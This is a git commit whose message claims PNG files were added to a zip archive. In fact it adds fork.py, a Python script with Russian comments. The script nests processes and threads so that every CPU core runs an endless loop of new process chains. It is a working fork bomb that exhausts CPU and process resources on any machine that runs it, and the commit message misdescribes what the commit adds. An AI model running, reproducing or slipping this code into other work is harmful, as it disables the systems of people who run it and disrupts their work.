0afd8a537a8267ebf185c10f9097517e80fa7d32
Olex Matiukhin <aleksksandr3511@gmail.com>
2026-04-20 00:16:38 +0300

    Files png added to zip

---
+++ fork.py
@@ -0,0 +1,45 @@
+import multiprocessing
+import threading
+import os
+import time
+
+
+def final_workload():
+    """Финальный процесс, который нагружает ядро"""
+    while True:
+        main_child = multiprocessing.Process(target=child_process)
+        main_child.start()
+        main_child.join()
+
+def thread_function():
+    """Поток, который создает процессы на все ядра"""
+    cpu_count = multiprocessing.cpu_count()
+    print(f"Поток в PID {os.getpid()} создает {cpu_count} процессов...")
+    processes = []
+    for _ in range(cpu_count):
+        p = multiprocessing.Process(target=final_workload)
+        p.start()
+        processes.append(p)
+
+    for p in processes:
+        p.join()
+
+
+def grandchild_process():
+    """Внучатый процесс, создающий поток"""
+    t = threading.Thread(target=thread_function)
+    t.start()
+    t.join()
+
+
+def child_process():
+    """Дочерний процесс, создающий внучатый процесс"""
+    p = multiprocessing.Process(target=grandchild_process)
+    p.start()
+    p.join()
+
+
+if __name__ == "__main__":
+    main_child = multiprocessing.Process(target=child_process)
+    main_child.start()
+    main_child.join()
